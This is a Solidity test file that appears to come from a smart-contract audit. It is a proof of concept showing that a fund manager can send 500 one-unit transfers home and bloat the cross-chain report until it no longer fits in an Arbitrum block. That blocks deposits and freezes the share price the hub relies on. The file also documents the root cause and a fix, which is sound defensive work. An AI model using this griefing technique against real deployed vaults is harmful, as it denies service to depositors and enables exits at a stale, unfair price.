// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {CrossChainFixture} from "./helpers/CrossChainFixture.sol";

/// @title PoC: dust transfers home bloat the report until no VAA fits in a hub block, so the manager can switch reports off
/// @notice Finding (medium). Lens: cross-chain messaging and bridging (gas griefing of `deliver`, report liveness).
///
/// Root cause: every hub-bound transit still in flight is an entry of the report's `inFlightToHub`
/// (`SpokeCrossChainLib._build`), the list has no bound, `SpokeVault.sendToHub` has no minimum amount (one base unit of
/// USDG passes `_checkQuote`), and an entry stays listed for `fillDeadline + maxReportAge` (6 h 26 min) whether or not
/// anyone fills it. On the hub, `ValueReportReceiver.deliver` stores the whole payload (`_payload[spokeIndex] =
/// vm.payload`, about 22,100 gas per new 32-byte word) and `CoreVaultLogic._matchReturnLeg` writes one `listed` slot per
/// new entry, so each new entry costs about 76,000 gas at delivery (measured here: 500 entries, 37.97M gas).
///
/// Attack (the manager only; about 430 cheap transactions on Robinhood per 6 h 26 min):
/// 1. `SpokeVault.sendToHub(1, Principal, 0, quote(1))`, 500 times. No relayer fills a 0.000001 USDG deposit; each one
///    expires and is refunded to its escrow later.
/// 2. Every report built while they are in flight carries 500 extra entries. Delivering its VAA needs more gas than
///    Arbitrum One's 32,000,000 block gas limit, so no report can be accepted; the stored report never gains the
///    entries, so they stay "new" for every later report as long as the manager keeps the list topped up.
///
/// Impact: the permissionless report channel (DEC-070, DEC-093), the hub's only view of the spoke, is switched off at
/// the manager's will and for as long as the manager likes:
/// - every mint reverts with `StaleSpokeReport` once the last accepted report is past its lifetime (deposits DoS);
/// - Payouts keep using the frozen report whatever happens on the spoke afterwards (a Payout never checks the report's
///   age, Q57 reading), so a manager who is also a Shareholder can exit at a Share Price that no longer reflects the
///   spoke;
/// - a transfer home sent in that window is stranded for good (see `SendHomeStranded.t.sol`), and hub-to-spoke
///   arrivals are never confirmed.
///
/// Fix: bound the list and the entry size the manager controls. Enforce a minimum send amount (at least
/// `MIN_LISTED_ARRIVAL`) and a cap on concurrent hub-bound transits in flight (a small constant such as 32); on the hub
/// store `keccak256(payload)` plus the fields the Core Vault reads instead of the whole payload.
contract DustSendsReportBloatPoC is CrossChainFixture {
    /// @dev Arbitrum One's block gas limit: no transaction can use more.
    uint256 internal constant ARBITRUM_BLOCK_GAS_LIMIT = 32_000_000;

    function test_POC_dustSendsHomeMakeReportsUndeliverable() public {
        // A fund with capital on Robinhood and an accepted report.
        _deposit(alice, 100_000e6);
        (, uint256 depositId) = _sendToSpoke(50_000e6, 49_975e6);
        _fillOnSpoke(depositId);
        _reportAndDeliver(900);

        // 1. The manager sends one base unit of USDG home, 500 times (0.0005 USDG in total).
        vm.chainId(SPOKE);
        vm.startPrank(manager);
        for (uint256 i; i < 500; ++i) {
            spoke.sendToHub(1, TransferKind.Principal, 0, _quote(1));
        }
        vm.stopPrank();
        vm.chainId(HUB);

        // 2. The next report carries 500 more entries (96 bytes each) and cannot be delivered within a hub block.
        uint256 index = _publishReport();
        skip(900);
        bytes memory vaa = _vaa(index);
        assertGt(vaa.length, 500 * 96);

        (bool delivered,) =
            address(receiver).call{gas: ARBITRUM_BLOCK_GAS_LIMIT}(abi.encodeCall(receiver.deliver, (vaa)));
        assertFalse(delivered, "the VAA does not fit in an Arbitrum One block");

        // It is only gas: with no limit the same VAA is accepted, at more than the block gas limit.
        uint256 snapshot = vm.snapshotState();
        uint256 gasBefore = gasleft();
        receiver.deliver(vaa);
        assertGt(gasBefore - gasleft(), ARBITRUM_BLOCK_GAS_LIMIT);
        vm.revertToState(snapshot);

        // Reports are off. Once the last accepted report is past its lifetime every mint reverts...
        skip(MAX_REPORT_AGE);
        _refreshPrices();
        usdc.mint(bob, 10_000e6);
        vm.startPrank(bob);
        usdc.approve(address(core), 10_000e6);
        vm.expectRevert(abi.encodeWithSelector(ICoreVault.StaleSpokeReport.selector, 0));
        core.deposit(10_000e6, 0);
        vm.stopPrank();

        // ...and a newer report is no better while the dust sends are in flight (they are for 6 h 26 min).
        index = _publishReport();
        skip(900);
        vaa = _vaa(index);
        (delivered,) = address(receiver).call{gas: ARBITRUM_BLOCK_GAS_LIMIT}(abi.encodeCall(receiver.deliver, (vaa)));
        assertFalse(delivered, "nor does the next one");
    }
}
